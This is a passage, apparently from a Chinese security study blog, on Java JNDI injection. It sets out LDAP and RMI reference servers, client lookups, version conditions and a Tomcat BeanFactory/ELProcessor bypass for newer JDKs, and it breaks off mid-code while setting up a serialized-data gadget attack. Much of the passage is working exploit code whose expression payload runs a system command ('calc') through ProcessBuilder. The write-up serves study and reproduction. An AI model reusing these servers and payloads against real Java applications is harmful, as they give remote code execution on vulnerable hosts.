sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">///组装返回的 LDAP 条目</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDILdapClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-comment">//        IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup(&quot;ldap://localhost:1099/remoteObj&quot;);</span><br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) initialContext.lookup(<span class="hljs-string">&quot;ldap://127.0.0.1:1234/EvilObject&quot;</span>);<br><br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用 python 开一个服务监听 8000端口</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242113052.png"></p><p>接下来启动服务端，启动客户端，弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242113525.png"></p><h5 id="使用-ApacheDirectoryStudio-搭建-LDAP-服务"><a href="#使用-ApacheDirectoryStudio-搭建-LDAP-服务" class="headerlink" title="使用 ApacheDirectoryStudio 搭建 LDAP 服务"></a>使用 ApacheDirectoryStudio 搭建 LDAP 服务</h5><p><strong>注意：系统的 java 环境使用 jdk 11，jdk 8 的版本都运行不了 LDAP 环境！</strong></p><p>新建一个 LDAP 服务，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250821834.png"></p><p>这样就搭建成功了：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242113529.png"></p><blockquote><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，<code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的默认值被设置为 false，对 LDAP Reference 远程工厂类的加载增加了限制。</p><p>所以，当JDK版本介于 8u191、7u201、6u211 与 6u141、7u131、8u121 之间时，我们就可以利用LDAP+Reference 的技巧来进行JNDI注入的利用。</p><p><font style="color:rgb(80, 80, 92);">因此，</font><strong><font style="color:rgb(80, 80, 92);">这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下</font></strong><font style="color:rgb(80, 80, 92);">。</font></p></blockquote><h2 id="3-3-jndi-结合-CORBA"><a href="#3-3-jndi-结合-CORBA" class="headerlink" title="3.3 jndi 结合 CORBA"></a>3.3 <font style="color:rgb(76, 76, 87);">jndi 结合 CORBA</font></h2><blockquote><p>一个简单的流程是：<code>resolve_str</code> 最终会调用到 <code>StubFactoryFactoryStaticImpl.createStubFactory</code> 去加载远程 class 并调用 newInstance 创建对象，其内部使用的 ClassLoader 是 <code>RMIClassLoader</code>，在反序列化 stub 的上下文中，默认不允许访问远程文件，因此这种方法在实际场景中比较少用。所以就不深入研究了。</p></blockquote><h2 id="3-4-绕过-jdk-高版本"><a href="#3-4-绕过-jdk-高版本" class="headerlink" title="3.4 绕过 jdk 高版本"></a>3.4 绕过 jdk 高版本</h2><h3 id="3-4-1-8u191-之前"><a href="#3-4-1-8u191-之前" class="headerlink" title="3.4.1 8u191 之前"></a>3.4.1 8u191 之前</h3><p>这里的版本为 jdk 8u121 &lt; temp &lt; 8u191 </p><p>这个之间版本绕过方法便是上文所述的 ldap 的 jndi 漏洞</p><h3 id="3-4-2-8u191-之后"><a href="#3-4-2-8u191-之后" class="headerlink" title="3.4.2 8u191 之后"></a>3.4.2 8u191 之后</h3><p><strong><font style="color:rgb(80, 80, 92);">8u191 之后，在使用 </font></strong><code>URLClassLoader</code><strong><font style="color:rgb(80, 80, 92);"> 加载器加载远程类时，</font></strong><font style="color:rgb(80, 80, 92);">通过添加 </font><strong><font style="color:rgb(83, 83, 96);">trustURLCodebase 的值是否为 true</font></strong><font style="color:rgb(80, 80, 92);"> ，让我们无法加载 codebase，也就是无法进行 URLClassLoader 的攻击。</font></p><p><font style="color:rgb(80, 80, 92);">要想绕过就要找到这么一个类：</font></p><ul><li><font style="color:rgb(80, 80, 92);">服务端本地 ClassPath 中存在恶意 Factory 类可被利用来作为 Reference Factory 进行攻击利用</font></li><li><font style="color:rgb(80, 80, 92);">Factory 类必须实现 </font><code>javax.naming.spi.ObjectFactory</code><font style="color:rgb(80, 80, 92);"> 接口，可利用该接口的 getObjectInstance() 方法</font></li></ul><p>我们找到 <code>org.apache.naming.factory.BeanFactory</code>类，其满足上述条件并存在于 Tomcat8 依赖包中，应用广泛。该类的 <code>getObjectInstance()</code> 函数中会通过反射的方式实例化 Reference 所指向的任意 Bean Class(Bean Class 就类似于我们之前说的那个 CommonsBeanUtils 这种)，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。</p><h4 id="绕过一：利用本地恶意-Class"><a href="#绕过一：利用本地恶意-Class" class="headerlink" title="绕过一：利用本地恶意 Class"></a>绕过一：<font style="color:rgb(76, 76, 87);">利用本地恶意 Class</font></h4><h5 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h5><p>首先是 tomcat 环境，以下三个必须存在并且版本尽量选在 9.0.64 以前的，（9.0.64 以后的版本大多数漏洞都被修复了，不能利用）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-el-api --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-el-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.66<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-jasper-el --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper-el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.66<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.66<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="源码复现："><a href="#源码复现：" class="headerlink" title="源码复现："></a>源码复现：</h5><p>参考：<a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-jdk-%E7%89%88%E6%9C%AC%E5%9C%A8-8u191-%E4%B9%8B%E5%90%8E%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-jdk-%E7%89%88%E6%9C%AC%E5%9C%A8-8u191-%E4%B9%8B%E5%90%8E%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F</a> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-comment">// JNDI 高版本 jdk 绕过服务端  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJava</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;[*]Evil RMI Server is Listening on port: 1099&quot;</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry( <span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>                                          <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 强制将&#x27;x&#x27;属性的setter从&#x27;setX&#x27;变为&#x27;eval&#x27;, 详细逻辑见BeanFactory.getObjectInstance代码</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        <span class="hljs-comment">// 利用表达式执行命令</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;)&quot;</span> +<br>                                  <span class="hljs-string">&quot;.newInstance().getEngineByName(\&quot;JavaScript\&quot;)&quot;</span> +<br>                                  <span class="hljs-string">&quot;.eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        System.out.println(<span class="hljs-string">&quot;[*]Evil command: calc&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;Object&quot;</span>, referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJavaServerRebind</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">resourceRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<br>                                                  <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span> );<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;Runtime.getRuntime().exe(&#x27;calc&#x27;)&quot;</span> ));<br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, resourceRef);<br>        System.out.println(<span class="hljs-string">&quot;ServerRebind Success&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJavaClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://localhost:1099/Object&quot;</span>;<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        context.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242115690.png"></p><h5 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h5><p>前面的流程还是进入 <code>lookup</code> 方法，到 <code>RegistryContext</code> 类的 <code>decodeObject()</code> 方法，这个方法当中调用了 <code>getObjectInstance()</code>。然后来到 <code>getObjectFactoryFromReference</code><font style="color:#080808;background-color:#ffffff;"> 开始跟：</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242115373.png"></p><p>然后通过 loadClass 加载 <code>org.apache.naming.factory.BeanFactory</code><font style="color:#080808;background-color:#ffffff;">并赋值给 clas </font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117328.png"></p><p><font style="color:#080808;background-color:#ffffff;">将 clas 强转为 </font><strong><font style="color:#080808;background-color:#ffffff;">ObjectFactory  </font></strong><font style="color:#080808;background-color:#ffffff;">类型</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117362.png"></p><p>然后经过一系列复杂的赋值，最终在 ref 的 className 中获取到了 “javax.el.ELProcessor” ，classFactory 获取到了”org.apache.naming.factory.BeanFactory”</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117627.png"></p><p><strong>getObjectInstance</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117347.png"></p><p>到了 getObjectInstance 之后便是整理变量，准备执行 invoke 方法</p><p>ra  通过利用 Java 的脚本引擎（JavaScript ）在运行时构造并调用 <code>ProcessBuilder</code>，最终在目标主机上执行系统命令 <code>calc</code>，就是获取 beanClass 即 <code>javax.el.ELProcessor</code> 类的 eval() 方法并和 x 属性</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242118019.png"></p><p>可以看到这里的一个 value 中封装的就是恶意代码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117409.png"></p><p>最终代码在 method.invoke 处，<font style="color:rgb(80, 80, 92);">通过method.invoke()即反射调用的来执行</font><br><code>&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;calc&#39;]).start()&quot;)</code>。弹出计算器。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242118772.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242118088.png"></p><h4 id="绕过二：LDAP返回序列化数据，触发本地Target"><a href="#绕过二：LDAP返回序列化数据，触发本地Target" class="headerlink" title="绕过二：LDAP返回序列化数据，触发本地Target"></a>绕过二：<font style="color:rgb(33, 53, 71);">LDAP返回序列化数据，触发本地Target</font></h4><blockquote><p>LDAP 服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象。如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的<code>obj.decodeObject()</code> 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化咯多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。</p></blockquote><h5 id="复现：-1"><a href="#复现：-1" class="headerlink" title="复现："></a><font style="color:rgb(80, 80, 92);">复现：</font></h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.80<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.util.Base64;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span 